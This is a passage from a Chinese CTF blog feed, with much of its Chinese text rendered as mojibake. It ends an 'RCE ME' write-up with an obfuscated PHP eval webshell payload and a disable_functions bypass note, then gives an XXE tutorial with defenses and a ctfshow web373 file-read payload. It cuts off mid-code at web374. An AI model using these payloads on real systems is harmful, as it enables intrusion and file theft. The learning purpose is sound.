important">&lt;?php</span><span class="token variable">$funcation</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'assert'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'(eval($_POST[attack]))'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"(~<span class="token interpolation"><span class="token variable">$funcation</span></span>)(~<span class="token interpolation"><span class="token variable">$cmd</span></span>)"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$payload</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>code<span class="token operator">=</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span><span class="token number">9</span>E<span class="token operator">%</span><span class="token number">8</span>C<span class="token operator">%</span><span class="token number">8</span>C<span class="token operator">%</span><span class="token number">9</span>A<span class="token operator">%</span><span class="token number">8</span>D<span class="token operator">%</span><span class="token number">8</span>B<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span><span class="token constant">D7</span><span class="token operator">%</span><span class="token number">9</span>A<span class="token operator">%</span><span class="token number">89</span><span class="token operator">%</span><span class="token number">9</span>E<span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span><span class="token constant">D7</span><span class="token operator">%</span><span class="token constant">DB</span><span class="token operator">%</span><span class="token constant">A0</span><span class="token operator">%</span><span class="token constant">AF</span><span class="token operator">%</span><span class="token constant">B0</span><span class="token operator">%</span><span class="token constant">AC</span><span class="token operator">%</span><span class="token constant">AB</span><span class="token operator">%</span><span class="token constant">A4</span><span class="token operator">%</span><span class="token number">9</span>E<span class="token operator">%</span><span class="token number">8</span>B<span class="token operator">%</span><span class="token number">8</span>B<span class="token operator">%</span><span class="token number">9</span>E<span class="token operator">%</span><span class="token number">9</span>C<span class="token operator">%</span><span class="token number">94</span><span class="token operator">%</span><span class="token constant">A2</span><span class="token operator">%</span><span class="token constant">D6</span><span class="token operator">%</span><span class="token constant">D6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token constant">POST</span><span class="token punctuation">:</span>attack<span class="token operator">=</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ÁÑ∂Âêé‰∏äËöÅÂâëËøûÊé•</p><p>Ê†πÁõÆÂΩï‰∏ãÊúâ‰∏™readflagÔºåÈúÄË¶ÅÊâßË°åreadflagÊâçËÉΩÂæóÂà∞flagÔºå‰ΩÜÊòØÂõ†‰∏∫ÈôêÂà∂‰∫ÜÂæàÂ§öÂáΩÊï∞ÔºåÊâÄ‰ª•‰∏çÂ§™Ë°å</p><p>ÂèØ‰ª•‰ΩøÁî®ËöÅÂâëÁöÑÁªïËøádisable_functionsÁöÑÊèí‰ª∂(Linux‰∏ã)</p><p><img src="rceme_2.png" loading="lazy"></p><p><img src="rceme_3.png" loading="lazy"></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/105656737">RCE ME</a></p>]]></content>
      
      
      <categories>
          
          <category> ÂÆâÂÖ®Áõ∏ÂÖ≥ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ÊûÅÂÆ¢Â§ßÊåëÊàò </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webÂÖ•Èó®-xxe</title>
      <link href="/2024/08/05/web%E5%85%A5%E9%97%A8-xxe/"/>
      <url>/2024/08/05/web%E5%85%A5%E9%97%A8-xxe/</url>
      
        <content type="html"><![CDATA[<h3 id="ÂâçË®Ä"><a href="#ÂâçË®Ä" class="headerlink" title="ÂâçË®Ä"></a>ÂâçË®Ä</h3><p><a href="https://www.cnblogs.com/r00tuser/p/7255939.html">[xxeÊºèÊ¥ûÁöÑÂ≠¶‰π†‰∏éÂà©Áî®ÊÄªÁªì]</a></p><h4 id="xmlÂü∫Á°ÄÁü•ËØÜ"><a href="#xmlÂü∫Á°ÄÁü•ËØÜ" class="headerlink" title="xmlÂü∫Á°ÄÁü•ËØÜ"></a>xmlÂü∫Á°ÄÁü•ËØÜ</h4><p>Ë¶Å‰∫ÜËß£xxeÊºèÊ¥ûÔºåÈÇ£‰πà‰∏ÄÂÆöÂæóÂÖàÊòéÁôΩÂü∫Á°ÄÁü•ËØÜÔºå‰∫ÜËß£xmlÊñáÊ°£ÁöÑÂü∫Á°ÄÁªÑÊàê„ÄÇ</p><pre class="language-markup" data-language="markup"><code class="language-markup">XMLÁî®‰∫éÊ†áËÆ∞ÁîµÂ≠êÊñá‰ª∂‰ΩøÂÖ∂ÂÖ∑ÊúâÁªìÊûÑÊÄßÁöÑÊ†áËÆ∞ËØ≠Ë®ÄÔºåÂèØ‰ª•Áî®Êù•Ê†áËÆ∞Êï∞ÊçÆ„ÄÅÂÆö‰πâÊï∞ÊçÆÁ±ªÂûãÔºåÊòØ‰∏ÄÁßçÂÖÅËÆ∏Áî®Êà∑ÂØπËá™Â∑±ÁöÑÊ†áËÆ∞ËØ≠Ë®ÄËøõË°åÂÆö‰πâÁöÑÊ∫êËØ≠Ë®Ä„ÄÇXMLÊñáÊ°£ÁªìÊûÑÂåÖÊã¨XMLÂ£∞Êòé„ÄÅDTDÊñáÊ°£Á±ªÂûãÂÆö‰πâÔºàÂèØÈÄâÔºâ„ÄÅÊñáÊ°£ÂÖÉÁ¥†</code></pre><h5 id="xmlÊñáÊ°£ÁöÑÊûÑÂª∫Ê®°Âùó"><a href="#xmlÊñáÊ°£ÁöÑÊûÑÂª∫Ê®°Âùó" class="headerlink" title="xmlÊñáÊ°£ÁöÑÊûÑÂª∫Ê®°Âùó"></a>xmlÊñáÊ°£ÁöÑÊûÑÂª∫Ê®°Âùó</h5><p>ÊâÄÊúâÁöÑ XML ÊñáÊ°£Ôºà‰ª•Âèä HTML ÊñáÊ°£ÔºâÂùáÁî±‰ª•‰∏ãÁÆÄÂçïÁöÑÊûÑÂª∫Ê®°ÂùóÊûÑÊàêÔºö</p><pre class="language-markup" data-language="markup"><code class="language-markup">ÂÖÉÁ¥†Â±ûÊÄßÂÆû‰ΩìPCDATACDATA</code></pre><p>‰∏ãÈù¢ÊòØÊØè‰∏™ÊûÑÂª∫Ê®°ÂùóÁöÑÁÆÄË¶ÅÊèèËø∞„ÄÇ</p><h5 id="ÂÖÉÁ¥†"><a href="#ÂÖÉÁ¥†" class="headerlink" title="ÂÖÉÁ¥†"></a>ÂÖÉÁ¥†</h5><p>ÂÖÉÁ¥†ÊòØ XML ‰ª•Âèä HTML ÊñáÊ°£ÁöÑ‰∏ªË¶ÅÊûÑÂª∫Ê®°ÂùóÔºåÂÖÉÁ¥†ÂèØÂåÖÂê´ÊñáÊú¨„ÄÅÂÖ∂‰ªñÂÖÉÁ¥†ÊàñËÄÖÊòØÁ©∫ÁöÑ„ÄÇ<br>ÂÆû‰æã:</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>body text in between<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">></span></span>some message in between<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">></span></span></code></pre><p>Á©∫ÁöÑ HTML ÂÖÉÁ¥†ÁöÑ‰æãÂ≠êÊòØ ‚Äúhr‚Äù„ÄÅ‚Äùbr‚Äù ‰ª•Âèä ‚Äúimg‚Äù„ÄÇ</p><h5 id="Â±ûÊÄß"><a href="#Â±ûÊÄß" class="headerlink" title="Â±ûÊÄß"></a>Â±ûÊÄß</h5><p>Â±ûÊÄßÂèØÊèê‰æõÊúâÂÖ≥ÂÖÉÁ¥†ÁöÑÈ¢ùÂ§ñ‰ø°ÊÅØ<br>ÂÆû‰æãÔºö</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>computer.gif<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre><h5 id="ÂÆû‰Ωì"><a href="#ÂÆû‰Ωì" class="headerlink" title="ÂÆû‰Ωì"></a>ÂÆû‰Ωì</h5><p>ÂÆû‰ΩìÊòØÁî®Êù•ÂÆö‰πâÊôÆÈÄöÊñáÊú¨ÁöÑÂèòÈáè„ÄÇÂÆû‰ΩìÂºïÁî®ÊòØÂØπÂÆû‰ΩìÁöÑÂºïÁî®„ÄÇ</p><h5 id="PCDATA"><a href="#PCDATA" class="headerlink" title="PCDATA"></a>PCDATA</h5><p>PCDATA ÁöÑÊÑèÊÄùÊòØË¢´Ëß£ÊûêÁöÑÂ≠óÁ¨¶Êï∞ÊçÆÔºàparsed character dataÔºâ„ÄÇ<br>PCDATA ÊòØ‰ºöË¢´Ëß£ÊûêÂô®Ëß£ÊûêÁöÑÊñáÊú¨„ÄÇËøô‰∫õÊñáÊú¨Â∞ÜË¢´Ëß£ÊûêÂô®Ê£ÄÊü•ÂÆû‰Ωì‰ª•ÂèäÊ†áËÆ∞„ÄÇ</p><h5 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h5><p>CDATA ÁöÑÊÑèÊÄùÊòØÂ≠óÁ¨¶Êï∞ÊçÆÔºàcharacter dataÔºâ„ÄÇ<br>CDATA ÊòØ‰∏ç‰ºöË¢´Ëß£ÊûêÂô®Ëß£ÊûêÁöÑÊñáÊú¨„ÄÇ<br>DTD(ÊñáÊ°£Á±ªÂûãÂÆö‰πâ)</p><p>DTDÔºàÊñáÊ°£Á±ªÂûãÂÆö‰πâÔºâÁöÑ‰ΩúÁî®ÊòØÂÆö‰πâ XML ÊñáÊ°£ÁöÑÂêàÊ≥ïÊûÑÂª∫Ê®°Âùó„ÄÇ</p><p>DTD ÂèØ‰ª•Âú® XML ÊñáÊ°£ÂÜÖÂ£∞ÊòéÔºå‰πüÂèØ‰ª•Â§ñÈÉ®ÂºïÁî®„ÄÇ</p><h5 id="ÂÜÖÈÉ®Â£∞Êòé"><a href="#ÂÜÖÈÉ®Â£∞Êòé" class="headerlink" title="ÂÜÖÈÉ®Â£∞Êòé"></a>ÂÜÖÈÉ®Â£∞Êòé</h5><p> <strong>ex: <code>&lt;!DOCTYOE test any&gt;</code></strong></p><p>ÂÆåÊï¥ÂÆû‰æãÔºö</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span> <span class="token punctuation">[</span><span class="token internal-subset">  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">note</span> <span class="token attr-name">(to,from,heading,body)</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span>      <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">from</span>    <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">heading</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">body</span>    <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>George<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>John<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget the meeting!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span></code></pre><h5 id="Â§ñÈÉ®Â£∞ÊòéÔºàÂºïÁî®Â§ñÈÉ®DTDÔºâ"><a href="#Â§ñÈÉ®Â£∞ÊòéÔºàÂºïÁî®Â§ñÈÉ®DTDÔºâ" class="headerlink" title="Â§ñÈÉ®Â£∞ÊòéÔºàÂºïÁî®Â§ñÈÉ®DTDÔºâ"></a>Â§ñÈÉ®Â£∞ÊòéÔºàÂºïÁî®Â§ñÈÉ®DTDÔºâ</h5><p> <strong>ex: <code>&lt;!DOCTYPE test SYSTEM &#39;http://www.test.com/evil.dtd&#39;&gt;</code></strong></p><p>ÂÆåÊï¥ÂÆû‰æã:</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span> <span class="token name">SYSTEM</span> <span class="token string">"note.dtd"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>George<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>John<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget the meeting!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span> </code></pre><p>ËÄånote.dtdÁöÑÂÜÖÂÆπ‰∏∫:</p><pre class="language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt;</code></pre><h5 id="DTDÂÆû‰Ωì"><a href="#DTDÂÆû‰Ωì" class="headerlink" title="DTDÂÆû‰Ωì"></a>DTDÂÆû‰Ωì</h5><p>DTDÂÆû‰ΩìÊòØÁî®‰∫éÂÆö‰πâÂºïÁî®ÊôÆÈÄöÊñáÊú¨ÊàñÁâπÊÆäÂ≠óÁ¨¶ÁöÑÂø´Êç∑ÊñπÂºèÁöÑÂèòÈáèÔºåÂèØ‰ª•ÂÜÖÈÉ®Â£∞ÊòéÊàñÂ§ñÈÉ®ÂºïÁî®„ÄÇ</p><p>ÂÆû‰ΩìÂèàÂàÜ‰∏∫‰∏ÄËà¨ÂÆû‰ΩìÂíåÂèÇÊï∞ÂÆû‰Ωì</p><h6 id="‰∏ÄËà¨ÂÆû‰ΩìÁöÑÂ£∞ÊòéËØ≠Ê≥ï"><a href="#‰∏ÄËà¨ÂÆû‰ΩìÁöÑÂ£∞ÊòéËØ≠Ê≥ï" class="headerlink" title="‰∏ÄËà¨ÂÆû‰ΩìÁöÑÂ£∞ÊòéËØ≠Ê≥ï:"></a>‰∏ÄËà¨ÂÆû‰ΩìÁöÑÂ£∞ÊòéËØ≠Ê≥ï:</h6><p>ÂºïÁî®ÂÆû‰ΩìÁöÑÊñπÂºèÔºö&amp;ÂÆû‰ΩìÂêçÔºõ</p><p><strong>ÂèÇÊï∞ÂÆû‰ΩìÂè™ËÉΩÂú®DTD‰∏≠‰ΩøÁî®ÔºåÂèÇÊï∞ÂÆû‰ΩìÁöÑÂ£∞ÊòéÊ†ºÂºèÔºö</strong></p><p>ÂºïÁî®ÂÆû‰ΩìÁöÑÊñπÂºèÔºö%ÂÆû‰ΩìÂêçÔºõ</p><h6 id="ÂÜÖÈÉ®ÂÆû‰ΩìÂ£∞Êòé"><a href="#ÂÜÖÈÉ®ÂÆû‰ΩìÂ£∞Êòé" class="headerlink" title="ÂÜÖÈÉ®ÂÆû‰ΩìÂ£∞Êòé"></a>ÂÜÖÈÉ®ÂÆû‰ΩìÂ£∞Êòé</h6><p><strong>ex:<code>&lt;!ENTITY eviltest &quot;eviltest&quot;&gt;</code></strong></p><p>ÂÆåÊï¥ÂÆû‰æã:</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">writer</span> <span class="token attr-name">"Bill</span> <span class="token attr-name">Gates"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">copyright</span> <span class="token attr-name">"Copyright</span> <span class="token attr-name">W3School.com.cn"</span><span class="token punctuation">></span></span></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>test</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&writer;">&amp;writer;</span>&amp;copyright;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>test</span><span class="token punctuation">></span></span></code></pre><h6 id="Â§ñÈÉ®ÂÆû‰ΩìÂ£∞Êòé"><a href="#Â§ñÈÉ®ÂÆû‰ΩìÂ£∞Êòé" class="headerlink" title="Â§ñÈÉ®ÂÆû‰ΩìÂ£∞Êòé"></a>Â§ñÈÉ®ÂÆû‰ΩìÂ£∞Êòé</h6><p>ÂÆåÊï¥ÂÆû‰æã:</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY writer SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">&lt;!ENTITY copyright SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>author</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&writer;">&amp;writer;</span>&amp;copyright;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>author</span><span class="token punctuation">></span></span></code></pre><p>Âú®‰∫ÜËß£‰∫ÜÂü∫Á°ÄÁü•ËØÜÂêéÔºå‰∏ãÈù¢ÂºÄÂßã‰∫ÜËß£xmlÂ§ñÈÉ®ÂÆû‰ΩìÊ≥®ÂÖ•ÂºïÂèëÁöÑÈóÆÈ¢ò„ÄÇ<br>XXEÁöÑÊîªÂáª‰∏éÂç±ÂÆ≥ÔºàXML External EntityÔºâ</p><h5 id="‰Ωï‰∏∫XXE"><a href="#‰Ωï‰∏∫XXE" class="headerlink" title="‰Ωï‰∏∫XXE?"></a>‰Ωï‰∏∫XXE?</h5><p>Á≠îÔºö xxe‰πüÂ∞±ÊòØxmlÂ§ñÈÉ®ÂÆû‰ΩìÊ≥®ÂÖ•„ÄÇ‰πüÂ∞±ÊòØ‰∏äÊñá‰∏≠Âä†Á≤óÁöÑÈÇ£‰∏ÄÈÉ®ÂàÜ„ÄÇ</p><h4 id="ÊÄéÊ†∑ÊûÑÂª∫Â§ñÈÉ®ÂÆû‰ΩìÊ≥®ÂÖ•Ôºü"><a href="#ÊÄéÊ†∑ÊûÑÂª∫Â§ñÈÉ®ÂÆû‰ΩìÊ≥®ÂÖ•Ôºü" class="headerlink" title="ÊÄéÊ†∑ÊûÑÂª∫Â§ñÈÉ®ÂÆû‰ΩìÊ≥®ÂÖ•Ôºü"></a>ÊÄéÊ†∑ÊûÑÂª∫Â§ñÈÉ®ÂÆû‰ΩìÊ≥®ÂÖ•Ôºü</h4><p>ÊñπÂºè‰∏ÄÔºöÁõ¥Êé•ÈÄöËøáDTDÂ§ñÈÉ®ÂÆû‰ΩìÂ£∞Êòé<br>ÊñπÂºè‰∫åÔºöÈÄöËøáDTDÊñáÊ°£ÂºïÂÖ•Â§ñÈÉ®DTDÊñáÊ°£ÔºåÂÜçÂºïÂÖ•Â§ñÈÉ®ÂÆû‰ΩìÂ£∞Êòé<br>ÊñπÂºè‰∏âÔºöÈÄöËøáDTDÂ§ñÈÉ®ÂÆû‰ΩìÂ£∞ÊòéÂºïÂÖ•Â§ñÈÉ®ÂÆû‰ΩìÂ£∞ÊòéÔºàÂ•ΩÂÉèÊúâÁÇπÊãóÂè£ÔºåÂÖ∂ÂÆûÊÑèÊÄùÂ∞±ÊòØÂÖàÂÜô‰∏Ä‰∏™Â§ñÈÉ®ÂÆû‰ΩìÂ£∞ÊòéÔºåÁÑ∂ÂêéÂºïÁî®ÁöÑÊòØÂú®ÊîªÂáªËÄÖÊúçÂä°Âô®‰∏äÈù¢ÁöÑÂ§ñÈÉ®ÂÆû‰ΩìÂ£∞ÊòéÔºâ</p><h4 id="‰∫ßÁîüÂì™‰∫õÂç±ÂÆ≥Ôºü"><a href="#‰∫ßÁîüÂì™‰∫õÂç±ÂÆ≥Ôºü" class="headerlink" title="‰∫ßÁîüÂì™‰∫õÂç±ÂÆ≥Ôºü"></a>‰∫ßÁîüÂì™‰∫õÂç±ÂÆ≥Ôºü</h4><p>XXEÂç±ÂÆ≥1ÔºöËØªÂèñ‰ªªÊÑèÊñá‰ª∂<br>XXEÂç±ÂÆ≥2ÔºöÊâßË°åÁ≥ªÁªüÂëΩ‰ª§<br>XXEÂç±ÂÆ≥3ÔºöÊé¢ÊµãÂÜÖÁΩëÁ´ØÂè£<br>XXEÂç±ÂÆ≥4ÔºöÊîªÂáªÂÜÖÁΩëÁΩëÁ´ô</p><h4 id="Â¶Ç‰ΩïÈò≤Âæ°xxeÊîªÂáª"><a href="#Â¶Ç‰ΩïÈò≤Âæ°xxeÊîªÂáª" class="headerlink" title="Â¶Ç‰ΩïÈò≤Âæ°xxeÊîªÂáª"></a>Â¶Ç‰ΩïÈò≤Âæ°xxeÊîªÂáª</h4><p>ÊñπÊ°à‰∏Ä„ÄÅ‰ΩøÁî®ÂºÄÂèëËØ≠Ë®ÄÊèê‰æõÁöÑÁ¶ÅÁî®Â§ñÈÉ®ÂÆû‰ΩìÁöÑÊñπÊ≥ï</p><pre class="language-markup" data-language="markup"><code class="language-markup">PHPÔºölibxml_disable_entity_loader(true);JAVA:DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);PythonÔºöfrom lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></pre><p>ÊñπÊ°à‰∫å„ÄÅËøáÊª§Áî®Êà∑Êèê‰∫§ÁöÑXMLÊï∞ÊçÆ<br>ÂÖ≥ÈîÆËØçÔºö&lt;!DOCTYPEÂíå&lt;!ENTITYÔºåÊàñËÄÖÔºåSYSTEMÂíåPUBLIC„ÄÇ</p><h3 id="web373-378"><a href="#web373-378" class="headerlink" title="web373-378"></a>web373-378</h3><h4 id="web373-ÊúâÂõûÊòæxxe-Â§ñÈÉ®ÂÆû‰Ωì"><a href="#web373-ÊúâÂõûÊòæxxe-Â§ñÈÉ®ÂÆû‰Ωì" class="headerlink" title="web373(ÊúâÂõûÊòæxxe Â§ñÈÉ®ÂÆû‰Ωì)"></a>web373(ÊúâÂõûÊòæxxe Â§ñÈÉ®ÂÆû‰Ωì)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// ÂÖÅËÆ∏Âä†ËΩΩÂ§ñÈÉ®ÂÆû‰Ωì</span><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// xmlÊñá‰ª∂Êù•Ê∫ê‰∫éÊï∞ÊçÆÊµÅ</span><span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Âä†ËΩΩxmlÂÆû‰ΩìÔºåÂèÇÊï∞‰∏∫Êõø‰ª£ÂÆû‰Ωì„ÄÅÂä†ËΩΩÂ§ñÈÉ®Â≠êÈõÜ</span>    <span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Êää DOM ËäÇÁÇπËΩ¨Êç¢‰∏∫ SimpleXMLElement ÂØπË±°</span>    <span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// ËäÇÁÇπÂµåÂ•ó</span>    <span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">ctfshow</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$ctfshow</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span></code></pre><p>Ê≥®ÊÑèËøôÈáåÊòØ <code>echo $creds-&gt;ctfshow;</code>ÔºåË¶ÅÂ∞ÜËøîÂõûÁöÑÊï∞ÊçÆÂåÖÊã¨Âú® <code>&lt;ctfshow&gt;</code> ‰∏≠„ÄÇ<br>payload:</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">hsad</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">hsad</span> <span class="token attr-name">ANY</span><span class="token punctuation">></span></span>&lt;!ENTITY payload SYSTEM "file:///flag"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hsad</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ctfshow</span><span class="token punctuation">></span></span>        <span class="token entity named-entity" title="&payload;">&amp;payload;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ctfshow</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>hsad</span><span class="token punctuation">></span></span></code></pre><h4 id="web374-Êó†ÂõûÊòæxxe-Â§ñÈÉ®ÂÆû‰Ωì"><a href="#web374-Êó†ÂõûÊòæxxe-Â§ñÈÉ®ÂÆû‰Ωì" class="headerlink" title="web374(Êó†ÂõûÊòæxxe Â§ñÈÉ®ÂÆû‰Ωì)"></a>web374(Êó†ÂõûÊòæxxe Â§ñÈÉ®ÂÆû‰Ωì)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 